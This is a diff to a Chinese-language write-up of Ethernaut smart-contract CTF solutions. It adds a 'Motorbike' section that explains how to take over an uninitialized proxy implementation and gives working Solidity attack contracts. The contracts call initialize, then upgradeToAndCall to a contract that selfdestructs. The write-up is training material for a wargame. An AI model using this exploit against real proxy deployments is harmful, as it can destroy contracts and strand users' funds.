@@ -456,14 +456,23 @@ multicall函数可以重入, 利用这一点通过multicall函数调用一次dep
 ```solidity
 interface PuzzleWallet {
     function balances(address addr) external view returns (uint256);
+
     function admin() external view returns (address);
+
     function pendingAdmin() external view returns (address);
+
     function maxBalance() external view returns (address);
+
     function owner() external view returns (address);
+
     function proposeNewAdmin(address _newAdmin) external;
+
     function addToWhitelist(address addr) external;
+
     function setMaxBalance(uint256 _maxBalance) external;
+
     function multicall(bytes[] calldata data) external payable;
+
     function execute(address to, uint256 value, bytes calldata data) external payable;
 }
 
@@ -490,5 +499,42 @@ contract Hack {
     }
 
     receive() external payable {}
+}
+```
+
+## 26. Motorbike
+
+MotorBike合约的storage已经有initialize的标记, 无法再次调用initialize函数, 但engine合约的storage部分没有,
+通过查询MotorBike合约slot 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc的值,
+获取engine代码合约的地址为 0xbeeb399F0F7A7d68Bc821297AdEf84e813Ed1A09
+再调用engine合约的initialize函数获取upgrader权限
+之后通过upgradeToAndCall函数, 传入hack合约并执行initialize函数销毁自身
+
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.10;
+
+interface Engine {
+    function upgrader() external view returns (address);
+
+    function initialize() external;
+
+    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
+}
+
+contract Hack {
+    function initialize() external {
+        selfdestruct(payable(msg.sender));
+    }
+}
+
+contract Hack1 {
+    constructor() {
+        Engine e = Engine(0xbeeb399F0F7A7d68Bc821297AdEf84e813Ed1A09);
+        e.initialize();
+        // 传入Hack合约地址
+        e.upgradeToAndCall(0xD53542c0ea17f70A8035fb14b319f35Bf475208f, abi.encodeWithSignature("initialize()"));
+    }
 }
 ```
